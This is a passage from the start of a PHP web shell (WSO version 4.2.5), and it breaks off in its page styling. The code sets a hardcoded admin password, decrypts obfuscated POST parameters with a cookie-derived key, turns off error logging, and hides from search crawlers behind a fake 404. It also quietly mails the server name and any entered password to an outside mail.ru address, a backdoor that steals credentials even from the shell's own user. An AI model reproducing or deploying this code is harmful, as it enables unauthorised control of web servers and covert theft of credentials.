<?php
//--------------Watching webshell!--------------
if(array_key_exists('watching',$_POST)){
	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('hard_linux@mail.ru', 'root', $tmp); // Edit or delete!
}
//-----------------Password---------------------
$▛ = "21232f297a57a5a743894a0e4a801fc3"; //admin
$▘ = true;
$▜ = 'UTF-8';
$▚ = 'FilesMan';
$▙ = md5($_SERVER['HTTP_USER_AGENT']);
if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])."key"])) {
	prototype(md5($_SERVER['HTTP_HOST'])."key", $▙);
}
if(empty($_POST['charset']))
	$_POST['charset'] = $▜;
if (!isset($_POST['ne'])) {
	if(isset($_POST['a'])) $_POST['a'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['a'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
	if(isset($_POST['c'])) $_POST['c'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['c'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
	if(isset($_POST['p1'])) $_POST['p1'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p1'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
	if(isset($_POST['p2'])) $_POST['p2'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
	if(isset($_POST['p3'])) $_POST['p3'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p3'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
}
function decrypt($str,$pwd){$pwd=base64_encode($pwd);$str=base64_decode($str);$enc_chr="";$enc_str="";$i=0;while($i<strlen($str)){for($j=0;$j<strlen($pwd);$j++){$enc_chr=chr(ord($str[$i])^ord($pwd[$j]));$enc_str.=$enc_chr;$i++;if($i>=strlen($str))break;}}return base64_decode($enc_str);}
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
@define('VERSION', '4.2.5');
if(get_magic_quotes_gpc()) {
	function stripslashes_array($array) {
		return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
	}
	$_POST = stripslashes_array($_POST);
    $_COOKIE = stripslashes_array($_COOKIE);
}
/* (С) 11.2011 oRb */
if(!empty($▛)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $▛))
        prototype(md5($_SERVER['HTTP_HOST']), $▛);
    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $▛))
        hardLogin();
}
if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax']))
    $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$▘;

function hardLogin() {
		if(!empty($_SERVER['HTTP_USER_AGENT'])) {
		  $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
		  if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
		  header('HTTP/1.0 404 Not Found');
		  exit;
		  }
		}
	die("<pre align=center><form method=post>Password<br><input type=password name=pass style='background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='submit' style='border:none;background-color:#56AD15;color:#fff;cursor:pointer;'></form></pre>");
}
if(strtolower(substr(PHP_OS,0,3)) == "win")
	$os = 'win';
else
	$os = 'nix';
$safe_mode = @ini_get('safe_mode');
if(!$safe_mode)
    error_reporting(0);
$disable_functions = @ini_get('disable_functions');
$home_cwd = @getcwd();
if(isset($_POST['c']))
	@chdir($_POST['c']);
$cwd = @getcwd();
if($os == 'win') {
	$home_cwd = str_replace("\\", "/", $home_cwd);
	$cwd = str_replace("\\", "/", $cwd);
}
if($cwd[strlen($cwd)-1] != '/')
	$cwd .= '/';
/* (С) 04.2015 Pirat */
function hardHeader() {
	if(empty($_POST['charset']))
		$_POST['charset'] = $GLOBALS['▜'];
	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - WSO " . VERSION ."</title>
<style>
	body {background-color:#060A10; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;}
	#particles-js{width: 100%; height: 100px; background-color: #060a10; background-image: url(''); background-repeat: no-repeat; background-size: cover; background-position: 50% 50%;}
	body,td,th	{font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top;}
	table.info	{color:#C3C3C3;}
	table#toolsTbl {background-color: #060A10;}
	span,h1,a	{color:#fff !important;}
	span		{font-weight:bolder;}
	h1			{border-left:5px solid #2E6E9C;padding:2px 5px;font:14
